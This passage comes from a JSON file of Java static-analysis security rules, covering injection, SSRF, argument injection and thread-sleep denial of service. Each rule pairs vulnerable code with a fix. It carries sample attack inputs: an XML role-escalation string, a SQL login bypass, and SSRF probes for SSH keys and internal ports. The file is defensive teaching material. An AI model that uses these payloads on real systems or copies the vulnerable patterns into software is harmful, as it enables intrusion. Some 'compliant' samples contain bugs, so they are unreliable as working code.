enough.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/nosql-injections-in-rocket-chat/\">SonarSource, NoSQL Injections in Rocket.Chat 3.12.1</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/943\">CWE-943 - Improper Neutralization of Special Elements in Data Query Logic</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javasecurity:S5167": {
        "name": "HTTP response headers should not be vulnerable to injection attacks",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=java%3AS5122'>S5122</a>, <a href='/coding_rules#rule_key=java%3AS5146'>S5146</a>, <a href='/coding_rules#rule_key=java%3AS6287'>S6287</a> instead.</p>\n<h2>Why is this an issue?</h2>\n<p>User-provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications\nconstructing HTTP response headers based on tainted data could allow attackers to change security sensitive headers like Cross-Origin Resource Sharing\nheaders.</p>\n<p>Web application frameworks and servers might also allow attackers to inject new line characters in headers to craft malformed HTTP response. In\nthis case the application would be vulnerable to a larger range of attacks like HTTP Response Splitting/Smuggling. Most of the time this type of\nattack is mitigated by default modern web application frameworks but there might be rare cases where older versions are still vulnerable.</p>\n<p>As a best practice, applications that use user-provided data to construct the response header should always validate the data first. Validation\nshould be based on a whitelist.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n  String value = req.getParameter(\"value\");\n  resp.addHeader(\"X-Header\", value); // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n    String value = req.getParameter(\"value\");\n\n    String whitelist = \"safevalue1 safevalue2\";\n    if (!whitelist.contains(value))\n      throw new IOException();\n\n    resp.addHeader(\"X-Header\", value); // Compliant\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/index.php/HTTP_Response_Splitting\">Attack Category - HTTP Response Splitting</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/113\">CWE-113 - Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response\n  Splitting')</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javasecurity:S6399": {
        "name": "XML operations should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>XML injections occur when an application builds an XML-formatted string from user input without prior validation or sanitation. In such a case, a\ntainted user-controlled value can tamper with the XML string content. Especially, unexpected arbitrary elements and attributes can be inserted in the\ncorresponding XML description.</p>\n<p>A malicious injection payload could, for example:</p>\n<ul>\n  <li> Insert tags into the main XML document. </li>\n  <li> Add attributes to an existing XML tag. </li>\n  <li> Change the data value inside a tag. </li>\n</ul>\n<p>A malicious user-supplied value can perform other modifications depending on where and how the constructed data is later used.</p>\n<h3>What is the potential impact?</h3>\n<p>The consequences of an XML injection attack on an application vary greatly depending on the application’s logic. It can affect the application\nitself or another element if the XML document is used for cross-component data exchange. For this reason, the actual impact can range from benign\ninformation disclosure to critical remote code execution.</p>\n<h4>Information disclosure</h4>\n<p>An attacker can forge an attack payload that will modify the XML document so that it will become syntactically incorrect. In that case, when the\ndata is later used, the parsing component will raise a technical error. If displayed back to the attacker or made available through log files, this\ntechnical error may disclose sensitive business or technical information.</p>\n<p>This scenario, while in general the less severe one, is the most frequently encountered. It can combine with any other logic-dependant threat.</p>\n<h4>Internal requests tampering</h4>\n<p>Some applications communicate with backend micro-services APIs using XML-based protocols such as SOAP. When those applications are vulnerable to\nXML injections, attackers can tamper with the internal requests' content. This will allow them to change internal requests' parameters or locations\nwhich, in turn, can lead to various consequences like performing unauthorized actions or accessing sensitive data.</p>\n<p>For example, altering a user creation request in such a way can lead to a privilege escalation if attackers manage to modify the default account\nprivilege level.</p>\n<h4>Code execution</h4>\n<p>An application might build objects based on an XML serialization string. In that case, an attacker that would exploit an XML injection could be\nable to alter the serialization string to modify the corresponding object’s properties.</p>\n<p>Depending on the deserialization process, this might allow instantiating arbitrary objects or objects with sensitive properties altered. This can\nlead to arbitrary code being executed in the same way as a deserialization injection vulnerability.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code is an example of an overly simple authentication function: The role of a user is set in an XML file and the default user role is\n<code>user</code>.<br> This example code is vulnerable to an XML injection vulnerability because it builds an XML string from user input without prior\nsanitation or validation.</p>\n<p>In this particular case, the query can be exploited with the following string:</p>\n<pre>\nattacker&lt;/username&gt;&lt;role&gt;admin&lt;/role&gt;&lt;/user&gt;\n&lt;user&gt;&lt;username&gt;foo\n</pre>\n<p>By adapting and inserting this string into the <code>username</code> field, an attacker would be able to log in as an admin.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\n\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n    String xml =\n        \"\"\"&lt;user&gt;\n            &lt;username&gt;\"\"\"+req.getParameter(\"username\")+\"\"\"&lt;/username&gt;\n            &lt;role&gt;user&lt;/role&gt;\n        &lt;/user&gt;\"\"\";\n\n    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n\n    try {\n        DocumentBuilder builder = factory.newDocumentBuilder();\n        builder.parse(new InputSource(new StringReader(xml))); // Noncompliant\n    } catch (ParserConfigurationException | SAXException e) {\n        resp.sendError(400);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\n\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n\n    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n\n    try {\n        DocumentBuilder builder = factory.newDocumentBuilder();\n        Document doc = builder.newDocument();\n        Element user = doc.createElement(\"user\");\n        doc.appendChild(user);\n\n        Element usernameElement = doc.createElement(\"username\");\n        user.appendChild(usernameElement);\n        username_element.setTextContent(req.getParameter(\"username\"));\n\n        Element role = doc.createElement(\"role\");\n        user.appendChild(role);\n        role.setTextContent(\"user\");\n\n    } catch (ParserConfigurationException e) {\n        resp.sendError(400);\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>In most cases, building XML strings with a direct concatenation of user input is discouraged. While not always possible, a strong pattern-based\nvalidation can help sanitize tainted inputs. Likewise, converting to a harmless type can sometimes be a solution.</p>\n<p>However, directly constructing Java objects should be preferred over handling the properties of objects as strings.</p>\n<h4>Programmatic object building</h4>\n<p>In most cases, an application can directly create documents from user input without having to build and parse an XML string. Doing so prevents\ninjection vulnerabilities as XML document construction libraries and functions will properly escape and check the type of input values.</p>\n<p>Sometimes, the application might need to include the user input in a document built from a trusted XML string. In that case, the recommended\nsolution is to parse the trusted string first and then programmatically modify the resulting document.</p>\n<p>The example compliant code takes advantage of the <code>javax.xml</code> and <code>org.w3c.dom</code> libraries capabilities to programmatically\nbuild XML documents.</p>\n<h4>Converting to a harmless type</h4>\n<p>When the application allows it, casting user-submitted data to a harmless type can help prevent XML injection vulnerabilities. In particular,\nconverting user inputs to numeric types is an efficient sanitation mechanism.</p>\n<p>This mechanism can be extended to other types, including more complex ones. However, care should be taken when dealing with them, as manually\nvalidating or sanitizing complex types can represent a challenge.</p>\n<p>Note that choosing this solution can be error-prone: every user input has to be validated or sanitized without oversight.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/91\">CWE-91 - XML Injection (aka Blind XPath Injection)</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "javasecurity:S3649": {
        "name": "Database queries should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Database injections (such as SQL injections) occur in an application when the application retrieves data from a user or a third-party service and\ninserts it into a database query without sanitizing it first.</p>\n<p>If an application contains a database query that is vulnerable to injections, it is exposed to attacks that target any database where that query is\nused.</p>\n<p>A user with malicious intent carefully performs actions whose goal is to modify the existing query to change its logic to a malicious one.</p>\n<p>After creating the malicious request, the attacker can attack the databases affected by this vulnerability without relying on any\npre-requisites.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application that is vulnerable to SQL injection:<br> After discovering the injection, attackers inject data into the\nvulnerable field to execute malicious commands in the affected databases.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Identity spoofing and data manipulation</h4>\n<p>A malicious database query enables privilege escalation or direct data leakage from one or more databases. This threat is the most widespread\nimpact.</p>\n<h4>Data deletion and denial of service</h4>\n<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the\nattacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Chaining DB injections with other vulnerabilities</h4>\n<p>Attackers who exploit SQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some\ndefense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple\nattacks with great impact:</p>\n<ul>\n  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>\n  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE).\n    <ul>\n      <li> See <a href=\"https://blog.sonarsource.com/exploiting-hibernate-injections/\">our article on this topic</a> </li>\n    </ul>  </li>\n</ul>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code is an example of an overly simple authentication function. It is vulnerable to SQL injection because user-controlled data is\ninserted directly into a query string: The application assumes that incoming data always has a specific range of characters, and ignores that some\ncharacters may change the query logic to a malicious one.</p>\n<p>In this particular case, the query can be exploited with the following string:</p>\n<pre>\nfoo' OR 1=1 --\n</pre>\n<p>By adapting and inserting this template string into one of the fields (<code>user</code> or <code>pass</code>), an attacker would be able to log in\nas any user within the scoped user table.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\n@RestController\npublic class ApiController\n{\n    @Autowired\n    Connection connection;\n\n    @GetMapping(value = \"/authenticate\")\n    @ResponseBody\n    public ResponseEntity&lt;String&gt; authenticate(\n        @RequestParam(\"user\") String user,\n        @RequestParam(\"pass\") String pass) throws SQLException\n    {\n        String query = \"SELECT * FROM users WHERE user = '\" + user + \"' AND pass = '\" + pass + \"'\";\n\n        try (Statement statement = connection.createStatement()) {\n\n            ResultSet resultSet = statement.executeQuery(query);\n\n            if (!resultSet.next()) {\n                return new ResponseEntity&lt;&gt;(\"Unauthorized\", HttpStatus.UNAUTHORIZED);\n            }\n        }\n\n        return new ResponseEntity&lt;&gt;(\"Authentication Success\", HttpStatus.OK);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\n@RestController\npublic class ApiController\n{\n    @Autowired\n    Connection connection;\n\n    @GetMapping(value = \"/authenticate\")\n    @ResponseBody\n    public ResponseEntity&lt;String&gt; authenticate(\n        @RequestParam(\"user\") String user,\n        @RequestParam(\"pass\") String pass) throws SQLException\n    {\n        String query = \"SELECT * FROM users WHERE user = ? AND pass = ?\";\n\n        try (PreparedStatement statement = connection.prepareStatement(query)) {\n            statement.setString(1, user);\n            statement.setString(2, pass);\n\n            ResultSet resultSet = statement.executeQuery(query);\n\n            if (!resultSet.next()) {\n                return new ResponseEntity&lt;&gt;(\"Unauthorized\", HttpStatus.UNAUTHORIZED);\n            }\n        }\n\n        return new ResponseEntity&lt;&gt;(\"Authentication Success\", HttpStatus.OK);\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use prepared statements</h4>\n<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of an\ninterpreted context.</p>\n<p>For database queries, prepared statements are a natural mechanism to achieve this due to their internal workings.<br> Here is an example with the\nfollowing query string (Java SE syntax):</p>\n<pre>\nSELECT * FROM users WHERE user = ? AND pass = ?\n</pre>\n<p><strong>Note: Placeholders may take different forms, depending on the library used. For the above example, the question mark symbol '?' was used as\na placeholder.</strong></p>\n<p>When a prepared statement is used by an application, the database server compiles the query logic even before the application passes the literals\ncorresponding to the placeholders to the database.<br> Some libraries expose a <code>prepareStatement</code> function that explicitly does so, and\nsome do not - because they do it transparently.</p>\n<p>The compiled code that contains the query logic also includes the placeholders: they serve as parameters.</p>\n<p>After compilation, the query logic is frozen and cannot be changed.<br> So when the application passes the literals that replace the placeholders,\nthey are not considered application logic by the database.</p>\n<p>Consequently, the database server prevents the dynamic literals of a prepared statement from affecting the underlying query, and thus sanitizes\nthem.</p>\n<p>On the other hand, the application does not automatically sanitize third-party data (for example, user-controlled data) inserted directly into a\nquery. An attacker who controls this third-party data can cause the database to execute malicious code.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/exploiting-hibernate-injections/\">SonarSource, Exploiting Hibernate Injections</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html\">OWASP, SQL Injection Prevention Cheat\n  Sheet</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/89\">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ITdGBQ\">CERT, IDS00-J.</a> - Prevent SQL injection </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javasecurity:S5144": {
        "name": "Server-side requests should not be vulnerable to forging attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Server-Side Request Forgery (SSRF) occurs when attackers can coerce a server to perform arbitrary requests on their behalf.<br></p>\n<p>An SSRF vulnerability can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s\nresponse.<br> The absence of the corresponding response for the coerced request on the application is not a barrier to exploitation and thus must be\ntreated in the same way as basic SSRF.</p>\n<h3>What is the potential impact?</h3>\n<p>SSRF usually results in unauthorized actions or data disclosure in the vulnerable application or on a different system it can reach. Conditional to\nwhat is reachable, remote command execution can be achieved, although it often requires chaining with further exploitations.</p>\n<p>Information disclosure is SSRF’s core outcome. Depending on the extracted data, an attacker can perform a variety of different actions that can\nrange from low to critical severity.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Local file read to host takeover</h4>\n<p>An attacker manipulates an application into performing a local request for a sensitive file, such as <code>~/.ssh/id_rsa</code>, by using the File\nURI scheme <code>file://</code>.<br> Once in possession of the SSH keys, the attacker establishes a remote connection to the system hosting the web\napplication.</p>\n<h4>Internal Network Reconnaissance</h4>\n<p>An attacker enumerates internal accessible ports from the affected server or others to which the server can communicate by iterating over the port\nfield in the URL <code>http://127.0.0.1:{port}</code>.<br> Taking advantage of other supported URL schemas (dependent on the affected system), for\nexample, <code>gopher://127.0.0.1:3306</code>, an attacker would be able to connect to a database service and perform queries on it.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to SSRF as it performs an HTTP request to a URL defined by untrusted data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n    String location = req.getParameter(\"url\");\n\n    URL url = new URL(location);\n\n    HttpURLConnection  conn = (HttpURLConnection) url.openConnection();\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n    String location = req.getParameter(\"url\");\n\n    List&lt;String&gt; allowedHosts = new ArrayList&lt;String&gt;();\n    allowedHosts.add(\"https://trusted1.example.com/\");\n    allowedHosts.add(\"https://trusted2.example.com/\");\n\n    URL url = new URL(location);\n\n    if (allowedHosts.contains(location))\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Pre-Approved commands</h4>\n<p>Create a list of authorized and secure URLs that you want the application to be able to request.<br> If a user input does not match an entry in\nthis list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<h3>Pitfalls</h3>\n<h4>The trap of 'StartsWith' and equivalents</h4>\n<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure\nthat the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>\n<p>If the validation string does not contain a terminating path separator, the SSRF vulnerability remains; only the exploitation technique\nchanges.</p>\n<p>Thus, a validation like <code>startsWith(\"https://example.com\")</code> or an equivalent with the regex <code>^https://example\\.com.*</code> can be\nexploited with the following URL <code>https://example.commit.malicious.io</code>.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/\">Top 10 2021 Category A10 - Server-Side Request\n  Forgery (SSRF)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/918\">CWE-918 - Server-Side Request Forgery (SSRF)</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "javasecurity:S6350": {
        "name": "Constructing arguments of system commands from user input is security-sensitive",
        "htmlDesc": "<p>Constructing arguments of system commands from user input is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9920\">CVE-2016-9920</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29472\">CVE-2021-29472</a> </li>\n</ul>\n<p>Arguments of system commands are processed by the executed program. The arguments are usually used to configure and influence the behavior of the\nprograms. Control over a single argument might be enough for an attacker to trigger dangerous features like executing arbitrary commands or writing\nfiles into specific directories.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Malicious arguments can result in undesired behavior in the executed command. </li>\n  <li> Passing user input to a system command is not necessary. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Avoid constructing system commands from user input when possible. </li>\n  <li> Ensure that no risky arguments can be injected for the given program, e.g., type-cast the argument to an integer. </li>\n  <li> Use a more secure interface to communicate with other programs, e.g., the standard input stream (stdin). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>Arguments like <code>-delete</code> or <code>-exec</code> for the <code>find</code> command can alter the expected behavior and result in\nvulnerabilities:</p>\n<pre>\nString input = request.getParameter(\"input\");\nString cmd[] =  new String[] { \"/usr/bin/find\", input };\nRuntime.getRuntime().exec(cmd); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>Use an allow-list to restrict the arguments to trusted values:</p>\n<pre>\nString input = request.getParameter(\"input\");\nif (allowed.contains(input)) {\n  String cmd[] =  new String[] { \"/usr/bin/find\", input };\n  Runtime.getRuntime().exec(cmd);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/88\">CWE-88 - Argument Injection or Modification</a> </li>\n  <li> <a href=\"https://blog.sonarsource.com/php-supply-chain-attack-on-composer\">CVE-2021-29472</a> - PHP Supply Chain Attack on Composer </li>\n</ul>",
        "severity": "MAJOR"
      },
      "javasecurity:S6390": {
        "name": "Thread suspensions should not be vulnerable to Denial of Service attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Most modern applications use threads to handle incoming requests or other long-running tasks concurrently. In some cases, the number of concurrent\nthreads is limited to avoid system resource exhaustion due to too numerous actions being run.</p>\n<p>When an application uses user-controlled data as a parameter of a thread suspension operation, a Denial of Service attack can be made possible.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker with the capability to insert an arbitrary duration into a thread suspension operation could suspend the corresponding thread for a\nlong time. Depending on the application’s architecture and the thread handling logic, this can lead to a complete Denial of Service of the\napplication.</p>\n<p>Indeed, if the number of threads, either created by the application or allocated by a web server, is limited, the attacker will be able to suspend\nall of them at the same time. Without any remaining thread to handle actions, the application might badly answer, be slowed down, or become completely\nirresponsive.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>This code is vulnerable to a Denial of Service because it sets a thread’s suspension time from user input without prior validation or\nsanitation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        Long time = Long.parseLong(req.getParameter(\"time\"));\n        try {\n            Thread.sleep(time); // Noncompliant\n        } catch (InterruptedException e) {\n            resp.sendError(500);\n        }\n    }\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprotected void compliant(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        Long time = Long.parseLong(req.getParameter(\"time\"));\n        try {\n            Thread.sleep(Math.min(time, 1000));\n        } catch (InterruptedException e) {\n            resp.sendError(500);\n        }\n    }\n</pre>\n<h3>How does this work?</h3>\n<p>In most cases, it is discouraged to define a thread suspension time from user-input.</p>\n<p>If really necessary, the application should ensure that the provided suspension time is below a safe limit. Such a limit should be evaluated and\nset to the lowest possible time that ensures the application’s operation and restricts denial of service attacks.</p>\n<p>The example compliant code uses the <code>Math.min</code> function to ensure the suspension duration is below the limit of one second.</p>\n<p>Note that even when the suspension time is limited, an attacker who submits numerous requests at high speed can still manage always to consume all\navailable threads.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javasecurity:S6398": {
        "name": "JSON operations should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>JSON injections occur when an application builds a JSON-formatted string from user input without prior validation or sanitation. In such a case, a\ntainted user-controlled value can tamper with the JSON string content. Especially, unexpected arbitrary elements can be inserted in the corresponding\nJSON object. Those modifications can include:</p>\n<ul>\n  <li> Adding additional keys to a JSON dictionary. </li>\n  <li> Changing values types. </li>\n  <li> Adding elements in an array. </li>\n</ul>\n<p>A malicious user-supplied value can perform other modifications depending on where and how the constructed data is later used.</p>\n<h3>What is the potential impact?</h3>\n<p>The consequences of a JSON injection attack into an application vary greatly depending on the application’s logic. It can affect the application\nitself or another element if the JSON string is used for cross-component data exchange. For this reason, the actual impact can range from benign\ninformation disclosure to critical remote code execution.</p>\n<h4>Information disclosure</h4>\n<p>An attacker can forge an attack payload that will modify the JSON string so that it will become syntactically incorrect. In that case, when the\ndata is later used, the parsing component will raise a technical error. If displayed back to the attacker or made available through log files, this\ntechnical error may disclose sensitive business or technical information.</p>\n<p>This scenario, while in general the less severe one, is the most frequently encountered. It can combine with any other logic-dependant threat.</p>\n<h4>Privilege escalation</h4>\n<p>An application that would rely on JSON to store or propagate users' authentication levels and roles would be under threat of privilege escalations.\nIndeed, an attacker could tamper with the permissions storage object to insert arbitrary roles or privileges.</p>\n<p>While highly specific, similar issues can be faced in the following situations:</p>\n<ul>\n  <li> An application builds JSON payloads for HTTP requests. </li>\n  <li> An application builds JWT from user input. </li>\n</ul>\n<h4>Code execution</h4>\n<p>An application might build objects based on a JSON serialization string. In that case, an attacker that would exploit a JSON injection could be\nable to alter the serialization string to modify the corresponding object’s properties.</p>\n<p>Depending on the deserialization process, this might allow instantiating arbitrary objects or objects with sensitive properties altered. This can\nlead to arbitrary code being executed in the same way as a deserialization injection vulnerability.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to a JSON injection vulnerability because it builds a JSON string from user input without prior sanitation or\nvalidation. Therefore, an attacker can submit a tainted value that will tamper with the corresponding JSON object structure.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"21\" data-diff-type=\"noncompliant\">\nimport org.json.JSONObject;\n\npublic void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n    try {\n        String tainted = request.getParameter(\"value\");\n        String json = \"{\\\"key\\\":\\\"\"+ tainted +\"\\\"}\";\n        JSONObject obj = new JSONObject(json); // Noncompliant\n    } catch (JsonException e) {\n        resp.sendError(400)\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"21\" data-diff-type=\"compliant\">\nimport org.json.JSONObject;\n\npublic void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n    JSONObject obj = new JSONObject(json);\n    obj.put(\"key\", request.getParameter(\"value\"));\n}\n</pre>\n<h3>How does this work?</h3>\n<p>In most cases, it is discouraged to build JSON strings with a direct concatenation of user input. While not always possible, a strong pattern-based\nvalidation can help sanitize tainted inputs. Likewise, converting to a harmless type can sometimes be a solution.</p>\n<p>However, avoiding handling objects' properties as strings by directly constructing Java objects should be the preferred way.</p>\n<h4>Programmatic object building</h4>\n<p>In most cases, an application can directly create objects from user input without having to build and parse a JSON string. Doing so prevents\ninjection vulnerabilities as JSON object construction libraries and functions will properly escape and check the type of input values.</p>\n<p>Sometimes, the application might need to include the user input in an object built from a trusted JSON string. In that case, the recommended\nsolution is to parse the trusted string first and then programmatically modify the resulting object.</p>\n<p>The example compliant code uses the <code>org.json</code> libraries capabilities to dynamically build a JSON object without string parsing.</p>\n<h4>Converting to a harmless type</h4>\n<p>When the application allows it, converting user-submitted data to a harmless type can help prevent JSON injection vulnerabilities. In particular,\nconverting user inputs to numeric types is an efficient sanitation mechanism.</p>\n<p>This mechanism can be extended to other types, including more complex ones. However, care should be taken when dealing with them, as manually\nvalidating or sanitizing complex types can represent a challenge.</p>\n<p>Note that choosing this solution can be error-prone: every user input has to be validated or sanitized without oversight.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://www.talosintelligence.com/vulnerability_reports/TALOS-2018-0556\">CVE-2018-3879 - An exploitable JSON injection\n  vulnerability</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/76\">CWE-76 - Improper Neutralization of Equivalent Special Elements</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "javasecurity:S2091": {
        "name": "XPath expressions should not be vulnerable to injection attacks",
